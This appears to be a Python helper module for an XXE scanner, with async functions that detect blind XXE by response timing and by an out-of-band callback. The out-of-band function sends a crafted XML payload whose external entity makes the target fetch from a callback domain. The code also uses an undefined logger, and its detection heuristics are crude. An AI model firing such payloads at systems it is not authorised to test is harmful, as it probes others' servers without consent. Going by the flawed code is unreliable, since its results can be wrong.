"""
XXE Scanner - Enhanced Blind XXE Detection Helper

This module provides additional blind XXE detection capabilities.
"""

import asyncio
import time
from typing import Any


async def test_blind_xxe_timing(
    http_client, endpoint: dict[str, Any], payload: str, timeout_threshold: float = 5.0
) -> bool:
    """
    Test for blind XXE using timing analysis.

    Args:
        http_client: HTTP client instance
        endpoint: Target endpoint dict with url, method
        payload: XXE payload to test
        timeout_threshold: Time threshold in seconds to consider as vulnerable

    Returns:
        True if timing indicates XXE vulnerability
    """
    try:
        start_time = time.time()

        await http_client.request(
            endpoint.get("method", "POST"), endpoint["url"], headers={"Content-Type": "application/xml"}, data=payload
        )

        elapsed_time = time.time() - start_time

        # If response took significantly longer, might indicate XXE processing
        if elapsed_time > timeout_threshold:
            return True

    except asyncio.TimeoutError:
        # Timeout can indicate XXE attempting to load external resource
        return True
    except Exception as e:
        logger.debug(f"Error checking XXE out-of-band callback: {e}")

    return False


async def test_blind_xxe_oob(http_client, endpoint: dict[str, Any], canary_domain: str = None) -> dict[str, Any]:
    """
    Test for blind XXE using Out-of-Band (OOB) detection.

    This requires an external callback server (like Burp Collaborator).

    Args:
        http_client: HTTP client instance
        endpoint: Target endpoint dict
        canary_domain: Domain to use for callback (e.g., burpcollaborator.net)

    Returns:
        Dict with test results
    """
    if not canary_domain:
        # Use a default testing domain (won't actually callback, but tests the injection)
        canary_domain = "xxe-test.example.com"

    # OOB XXE payload with external DTD
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{canary_domain}/xxe-callback">
  %xxe;
]>
<root><data>test</data></root>"""

    try:
        response = await http_client.request(
            endpoint.get("method", "POST"), endpoint["url"], headers={"Content-Type": "application/xml"}, data=payload
        )

        if response:
            resp_text = await response.text()

            # Check for indicators that external entity was processed
            indicators = ["connection", "timeout", "dns", "resolve", canary_domain]

            for indicator in indicators:
                if indicator.lower() in resp_text.lower():
                    return {"vulnerable": True, "indicator": indicator, "method": "oob_detection"}

    except Exception as e:
        # Connection errors might indicate OOB attempt
        if "timeout" in str(e).lower() or "connection" in str(e).lower():
            return {"vulnerable": True, "indicator": "connection_error", "method": "oob_detection", "error": str(e)}

    return {"vulnerable": False}


# Export helper functions
__all__ = ["test_blind_xxe_timing", "test_blind_xxe_oob"]
